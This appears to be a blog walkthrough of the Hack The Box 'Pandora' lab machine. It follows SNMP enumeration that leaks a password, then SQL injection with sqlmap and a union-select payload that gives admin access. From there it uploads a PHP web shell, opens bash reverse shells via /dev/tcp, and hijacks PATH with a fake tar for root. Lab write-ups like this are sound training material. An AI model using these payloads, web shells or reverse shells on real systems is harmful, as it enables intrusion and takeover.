@@ -1,0 +1,209 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Pandora from HTB" /><meta property="og:locale" content="en" /><meta name="description" content="Pandora from HTB nmapgave this: ```bash sudo nmap -sU –min-rate=4000 -T4 10.10.11.136 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:10 +04 Nmap scan report for 10.10.11.136 Host is up (0.25s latency). Not shown: 991 open|filtered udp ports (no-response) PORT STATE SERVICE 161/udp open snmp" /><meta property="og:description" content="Pandora from HTB nmapgave this: ```bash sudo nmap -sU –min-rate=4000 -T4 10.10.11.136 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:10 +04 Nmap scan report for 10.10.11.136 Host is up (0.25s latency). Not shown: 991 open|filtered udp ports (no-response) PORT STATE SERVICE 161/udp open snmp" /><link rel="canonical" href="https://darkfears31.github.io/posts/Pandora-from-HTB/" /><meta property="og:url" content="https://darkfears31.github.io/posts/Pandora-from-HTB/" /><meta property="og:site_name" content="darkfears31’s Walktroughs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-06T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Pandora from HTB" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-06T00:00:00+00:00","datePublished":"2024-09-06T00:00:00+00:00","description":"Pandora from HTB nmapgave this: ```bash sudo nmap -sU –min-rate=4000 -T4 10.10.11.136 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 14:10 +04 Nmap scan report for 10.10.11.136 Host is up (0.25s latency). Not shown: 991 open|filtered udp ports (no-response) PORT STATE SERVICE 161/udp open snmp","headline":"Pandora from HTB","mainEntityOfPage":{"@type":"WebPage","@id":"https://darkfears31.github.io/posts/Pandora-from-HTB/"},"url":"https://darkfears31.github.io/posts/Pandora-from-HTB/"}</script><title>Pandora from HTB | darkfears31's Walktroughs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="darkfears31's Walktroughs"><meta name="application-name" content="darkfears31's Walktroughs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/162694375?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">darkfears31's Walktroughs</a></div><div class="site-subtitle font-italic">An PicoCTF and HackTheBox Walktroughs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/darkfears31" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://youtube.com/user/jadehawk" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Pandora from HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Pandora from HTB</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1725580800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/darkfears31">kaikaci</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="723 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><h1 id="pandora-from-htb">Pandora from HTB</h1><p><code class="language-plaintext highlighter-rouge">nmap</code>gave this:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre> <span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--min-rate</span><span class="o">=</span>4000 <span class="nt">-T4</span> 10.10.11.136
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-20 14:10 +04
+Nmap scan report <span class="k">for </span>10.10.11.136
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 991 open|filtered udp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT      STATE  SERVICE
+161/udp   open   snmp
+
+ nmap <span class="nt">-sCV</span> <span class="nt">--min-rate</span> 4000 <span class="nt">-p-</span> 10.10.11.136
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-08-20 14:00 +04
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open     http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</pre></table></code></div></div><p>Then use <code class="language-plaintext highlighter-rouge">snmpwalk</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>snmpwalk <span class="nt">-v</span> 1 <span class="nt">-c</span> public 10.10.11.136
+</pre></table></code></div></div><p>after long ass wait</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>iso.3.6.1.2.1.25.4.2.1.5.1004 <span class="o">=</span> STRING: <span class="s2">"-k start"</span>
+iso.3.6.1.2.1.25.4.2.1.5.1005 <span class="o">=</span> STRING: <span class="s2">"-k start"</span>
+	iso.3.6.1.2.1.25.4.2.1.5.1101 <span class="o">=</span> STRING: <span class="s2">"-u daniel -p HotelBabylon23"</span>
+iso.3.6.1.2.1.25.4.2.1.5.1140 <span class="o">=</span> STRING: <span class="s2">"-k start"</span>
+iso.3.6.1.2.1.25.4.2.1.5.1142 <span class="o">=</span> STRING: <span class="s2">"-k start"</span>
+</pre></table></code></div></div><p>With this i can login in <code class="language-plaintext highlighter-rouge">ssh</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>ssh daniel@10.10.11.136
+daniel@10.10.11.136<span class="s1">'s password:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+
+daniel@pandora:~$
+</span></pre></table></code></div></div><p>reading this file tells me that <code class="language-plaintext highlighter-rouge">/var/www/pandora</code>is being served on <code class="language-plaintext highlighter-rouge">80 port</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="nb">cat</span> /etc/apache2/sites-enabled/pandora.conf
+
+
+&lt;VirtualHost localhost:80&gt;
+  ServerAdmin admin@panda.htb
+  ServerName pandora.panda.htb
+  DocumentRoot /var/www/pandora
+  AssignUserID matt matt
+  &lt;Directory /var/www/pandora&gt;
+    AllowOverride All
+  &lt;/Directory&gt;
+  ErrorLog /var/log/apache2/error.log
+  CustomLog /var/log/apache2/access.log combined
+&lt;/VirtualHost&gt;
+</pre></table></code></div></div><p>forwarded port and accessed it:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>ssh <span class="nt">-L</span> 8000:127.0.0.1:80 daniel@10.10.11.136
+</pre></table></code></div></div><p>Then accessed site and found version, which is exploitable. With <code class="language-plaintext highlighter-rouge">sql-injection</code>i found <code class="language-plaintext highlighter-rouge">PHSESSID</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nb">sudo  </span>sqlmap <span class="nt">--url</span><span class="o">=</span><span class="s2">"http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''"</span> <span class="nt">--current-db</span> <span class="nt">--batch</span>
+
+
+
+<span class="o">[</span>14:54:39] <span class="o">[</span>INFO] retrieved: <span class="s1">'pandora'</span>
+current database: <span class="s1">'pandora'</span>
+
+</pre></table></code></div></div><p>Then listed <code class="language-plaintext highlighter-rouge">tables</code>in that database</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>sudo  sqlmap --url="http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables --batch
+
+
+| tservice_element                   |
+| tsesion                            |
+| tsesion_extended                   |
+| tsessions_php                      |
+| tskin                              |
+</pre></table></code></div></div><p>to get <code class="language-plaintext highlighter-rouge">session_id</code>we need <code class="language-plaintext highlighter-rouge">tsession_php</code>table</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> <span class="nb">sudo  </span>sqlmap <span class="nt">--url</span><span class="o">=</span><span class="s2">"http://localhost:8000/pandora_console/include/chart_generator.php?session_id=''"</span> <span class="nt">-D</span> pandora <span class="nt">-T</span> tsessions_php <span class="nt">--dump</span> <span class="nt">--batch</span>
+
+
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:<span class="s2">"daniel"</span><span class="p">;</span>
+| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:<span class="s2">"matt"</span><span class="p">;</span>alert_msg|a:0:<span class="o">{}</span>new_chat|b
+| gf40pukfdinc63nm5lkroidde6 | NULL
+</pre></table></code></div></div><p>We need <code class="language-plaintext highlighter-rouge">matt's </code>session id. then access the site with this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>http://localhost:8000/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
+</pre></table></code></div></div><p>to become the admin</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>http://localhost:8000/pandora_console/include/chart_generator.php?session_id=1%27%20union%20select%201,2,%27id_usuario|s:5:%22admin%22;%27%20--%20-
+</pre></table></code></div></div><p>Then open another <code class="language-plaintext highlighter-rouge">tab</code>and go to that <code class="language-plaintext highlighter-rouge">port</code> you will be <code class="language-plaintext highlighter-rouge">admin</code> Now you can upload files. I uploaded <code class="language-plaintext highlighter-rouge">php cmd</code>on site and got `cmd</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>&lt;?php
+system($_REQUEST['cmd']);
+?&gt;
+</pre></table></code></div></div><p>Then accessed the <code class="language-plaintext highlighter-rouge">cmd</code>with this link</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/images/php-shell.php?cmd=id
+</pre></table></code></div></div><p>To get reverse shell upload <code class="language-plaintext highlighter-rouge">reverse shell file</code>and with <code class="language-plaintext highlighter-rouge">cmd</code>execute it</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="c"># reverse.sh</span>
+
+<span class="c">#!/bin/bash</span>
+bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1'</span>
+</pre></table></code></div></div><p>upload it and with <code class="language-plaintext highlighter-rouge">cmd</code> type:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>/images/php-shell.php?cmd<span class="o">=</span> bash reverse.sh
+</pre></table></code></div></div><p>Then you will get <code class="language-plaintext highlighter-rouge">netcat</code>connection</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>rlwrap nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.10.16.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.136] 45852
+matt@pandora:/var/www/pandora/pandora_console/images<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span>
+</pre></table></code></div></div><hr /><p>User Flag is: b2c37562ccacb9f6a9f6a66a05898fe2 *** Let us find all the files with <code class="language-plaintext highlighter-rouge">SUID</code> bit set in the whole file system using the find utility with the:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+
+
+/usr/bin/pandora_backup
+</pre></table></code></div></div><p>To run that program we must escape the restricted shell which code we can find on <code class="language-plaintext highlighter-rouge">GTFOshells</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/bin/sh &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">"</span> | at now<span class="p">;</span> <span class="nb">tail</span> <span class="nt">-f</span> /dev/null
+</pre></table></code></div></div><p>This will make us able to run the program. Now to see what this program does we must use <code class="language-plaintext highlighter-rouge">strings</code>onto it. We don’t have <code class="language-plaintext highlighter-rouge">strings</code>on machine so we must download it with <code class="language-plaintext highlighter-rouge">nc</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>nc &lt;your_ip&gt; &lt;port&gt; &lt; /usr/bin/pandora_backup <span class="c"># on machine</span>
+nc <span class="nt">-nlvp</span> &lt;port&gt; <span class="o">&gt;</span> pandora_backup <span class="c"># on your local machine</span>
+</pre></table></code></div></div><p>After downloading that file run strings onto it and we are able to find that it uses <code class="language-plaintext highlighter-rouge">tar</code>with <code class="language-plaintext highlighter-rouge">relative path</code>so it can be exploited to grant us <code class="language-plaintext highlighter-rouge">root shell</code> go to machine and set <code class="language-plaintext highlighter-rouge">$PATH</code> variable to</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/home/matt:<span class="nv">$PATH</span>
+</pre></table></code></div></div><p>Then in <code class="language-plaintext highlighter-rouge">/home/matt</code>create file either for <code class="language-plaintext highlighter-rouge">netcat connection</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'#!/bin/bash
+ bash -i &gt;&amp; /dev/tcp/&lt;yourIP&gt;/&lt;PORT&gt; 0&gt;&amp;1'</span> <span class="o">&gt;</span> <span class="nb">tar</span>
+<span class="nv">$ </span><span class="nb">chmod</span> +x <span class="nb">tar</span>
+<span class="nv">$ </span>pandora_backup
+</pre></table></code></div></div><p>Then you will get connection on <code class="language-plaintext highlighter-rouge">nc</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 1235
+listening on <span class="o">[</span>any] 1235 ...
+connect to <span class="o">[</span>10.10.16.6] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.136] 47902
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>836<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@pandora:/home/matt# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>matt<span class="o">)</span>
+</pre></table></code></div></div><hr /><p>Root Flag is: f0e230f1810a9f5ca79dd2720ea7edb3 *** <img data-src="/assets/images/Screenshot from 2024-08-20 20-44-52.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >Hack The Box</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pandora+from+HTB+-+darkfears31%27s+Walktroughs&url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FPandora-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pandora+from+HTB+-+darkfears31%27s+Walktroughs&u=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FPandora-from-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fdarkfears31.github.io%2Fposts%2FPandora-from-HTB%2F&text=Pandora+from+HTB+-+darkfears31%27s+Walktroughs" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 